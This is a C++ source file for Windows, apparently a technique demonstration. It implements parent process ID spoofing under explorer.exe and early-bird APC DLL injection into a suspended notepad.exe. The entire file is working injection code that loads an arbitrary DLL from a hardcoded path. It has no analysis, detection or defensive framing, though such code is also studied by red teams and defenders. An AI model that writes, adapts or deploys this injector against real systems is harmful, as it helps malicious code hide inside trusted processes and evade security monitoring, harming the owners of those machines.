#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>

// get pid by process name
DWORD GetParentPidByName(const wchar_t* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W entry = { sizeof(PROCESSENTRY32W) };
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    const wchar_t* parentName = L"explorer.exe";
    const wchar_t* targetPath = L"C:\\Windows\\System32\\notepad.exe";
    wchar_t targetPathArray[MAX_PATH];
    wcscpy_s(targetPathArray, targetPath);
    const char* dllPath = "C:\\Users\\admin\\Desktop\\TestDll.dll";
    HANDLE hParent = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
    BOOL bSuccess = FALSE;
    STARTUPINFOEXW siex = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    do {
        // get parent pid and open parent process
        DWORD parentPid = GetParentPidByName(parentName);
        if (parentPid == 0) {
            std::cout << "[-] Can't found the PID of explorer.exe, error code: " << GetLastError() << "\n";
            break;
        }
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
        if (!hParent) {
            std::cout << "[-] Open explorer.exe failed, error code: " << GetLastError() << "\n";
            break;
        }
        std::cout << "[+] Open explorer.exe successfully, pid: " << parentPid;

        // initialize attribute list for parent process spoof
        SIZE_T attributeSize = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
        if (!lpAttributeList) break;
        if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attributeSize)) break;
        if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
            std::cout << "[-] Attribute list update failed, error code: " << GetLastError() << "\n";
            break;
        }

        // create suspended process
        siex.StartupInfo.cb = sizeof(siex);
        siex.lpAttributeList = lpAttributeList;
        BOOL cSuccess = CreateProcessW(NULL,  // program name
            targetPathArray,  // program name with argument
            NULL,  // use default process security descriptor, and process handle not pass to grandson process
            NULL,  // use default thread security descriptor, and thread handle not pass to grandson process
            FALSE,  // if inherit parent process handle
            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
            NULL,  // if inherit parent process environment
            NULL,  // if inherit parent process work directory
            &siex.StartupInfo,
            &pi
        );
        if (!cSuccess) {
            std::cout << "[-] Notepad.exe create failed, error code: " << GetLastError() << "\n";
            break;
        }
        std::cout << "[+] Notepad.exe create successfully, pid: " << pi.dwProcessId << "\n";

        // early bird inject
        SIZE_T pathLen = strlen(dllPath) + 1;
        LPVOID remoteBuf = VirtualAllocEx(pi.hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteBuf) {
            std::cout << "[-] VirtualAlloc within notepad.exe failed, error code: " << GetLastError() << "\n";
            break;
        }
        else {
            std::cout << "[+] VirtualAlloc within notepad.exe successfully\n";
        }
        BOOL wSuccess = WriteProcessMemory(pi.hProcess, remoteBuf, dllPath, pathLen, NULL);
        if (!wSuccess) {
            std::cout << "[-] WriteProcessMemory within notepad.exe failed, error code: " << GetLastError() << "\n";
            break;
        }
        else {
            std::cout << "[+] WriteProcessMemory within notepad.exe successfully\n";
        }
        FARPROC pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        if (!pLoadLibrary) {
            std::cout << "[-] Get LoadLibraryA address failed, error code: " << GetLastError() << "\n";
            break;
        }
        else {
            std::cout << "[+] Get LoadLibraryA address successfully\n";
        }
        if (!QueueUserAPC((PAPCFUNC)pLoadLibrary, pi.hThread, (ULONG_PTR)remoteBuf)) {
            std::cout << "[-] Join APC Queue failed.\n";
            break;
        }
        else {
            std::cout << "[+] Join APC Queue successfully.\n";
        }

        // resume thread
        ResumeThread(pi.hThread);
        bSuccess = TRUE;
        std::cout << "[+] Resume thread execute.\n";
    } while (0);

    // clean up
    if (!bSuccess && pi.hProcess) TerminateProcess(pi.hProcess, 0);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (lpAttributeList) {
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(GetProcessHeap(), 0, lpAttributeList);
    }
    if (hParent) CloseHandle(hParent);

    return bSuccess ? 0 : 1;
}